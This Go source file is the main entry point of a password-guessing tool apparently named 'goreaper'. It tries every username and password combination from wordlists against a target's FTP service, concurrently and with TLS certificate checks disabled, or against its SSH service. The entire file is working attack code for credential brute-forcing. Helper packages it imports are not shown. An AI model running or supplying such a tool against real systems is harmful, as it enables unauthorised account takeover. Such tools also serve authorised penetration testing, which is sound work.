package main

import (
	"crypto/tls"
	"fmt"
	"goreaper/brute"
	config "goreaper/brute/config"
	ftpbrute "goreaper/brute/ftp"
	sshbrute "goreaper/brute/ssh"
	"log"
	"sync"
	"sync/atomic"
	"time"

	"github.com/jlaffaye/ftp"
)

func startFTPBruteForce(ftpconfig *config.FtpConfig, wordlist []string, semaphore chan struct{}, wg *sync.WaitGroup, found *int32, start time.Time) {
	fmt.Printf("WORDLIST PATH: %s\n", wordlist)
	fmt.Printf("TARGET: %s\n", ftpconfig.Target)
	for _, user := range wordlist {
		for _, passw := range wordlist {
			semaphore <- struct{}{}
			wg.Add(1)
			go func(user, passw string) {
				defer wg.Done()
				var client *ftp.ServerConn
				var err error

				if ftpconfig.TlsFlag {
					client, err = ftp.Dial(ftpconfig.Target, ftp.DialWithTLS(&tls.Config{
						InsecureSkipVerify: true,
					}))
				} else {
					client, err = ftp.Dial(ftpconfig.Target)
				}

				if err != nil {
					log.Println(err)
					<-semaphore
					return
				}
				defer client.Quit()

				ftpbrute.TryLogin(client, user, passw, found, start)
				<-semaphore
			}(user, passw)

			if atomic.LoadInt32(found) == 1 {
				break
			}
		}
		if atomic.LoadInt32(found) == 1 {
			break
		}
	}
}

func StartSSHBruteForce(target string, userwordlist []string, passwordlist []string, found *int32, start time.Time) {
	fmt.Printf("USER WORDLIST PATH: %s\n", userwordlist)
	fmt.Printf("PASSWORD WORDLIST PATH: %s\n", passwordlist)
	fmt.Printf("TARGET: %s\n", target)
	for _, user := range userwordlist {
		for _, passw := range passwordlist {
			sshbrute.SSHLogin(user, passw, target, found, start)
			if atomic.LoadInt32(found) == 1 {
				break
			}
		}
		if atomic.LoadInt32(found) == 1 {
			break
		}
	}
}

func main() {
	var found int32
	var wg sync.WaitGroup

	sshconfig := config.SshConfig()
	ftpconfig := config.FtpLoadConfig()

	if sshconfig.HHelp {
		brute.Help()
		return
	}

	wordlist, isEmptyFtp := brute.WlLoader(ftpconfig.WordlistPath)
	userwordlistssh, isEmptySSHUser := brute.WlLoader(sshconfig.UserWordlist)
	passwordlist, isEmptySSHPass := brute.WlLoader(sshconfig.PassWordlist)

	start := time.Now()

	switch sshconfig.BrtOption {
	case "ftp":
		if ftpconfig.WordlistPath == "" || ftpconfig.Target == "" {
			fmt.Println("Invalid FTP call")
			return
		}
		semaphore := make(chan struct{}, ftpconfig.MaxConcurrent)
		startFTPBruteForce(ftpconfig, wordlist, semaphore, &wg, &found, start)
	case "ssh":
		if (isEmptySSHUser || isEmptySSHPass) && sshconfig.BrtOption == "ssh" {
			fmt.Println("Invalid SSH call")
			return
		}
		StartSSHBruteForce(sshconfig.Target, userwordlistssh, passwordlist, &found, start)
	default:
		fmt.Println("Invalid protocol. Use -pr ssh or -pr ftp")
		return
	}

	if isEmptyFtp && sshconfig.BrtOption == "ftp" {
		fmt.Println("Error: FTP wordlist is empty. Exiting.")
		return
	}

	wg.Wait()

	if atomic.LoadInt32(&found) == 0 {
		fmt.Println("User or password not found in wordlist")
	}
}
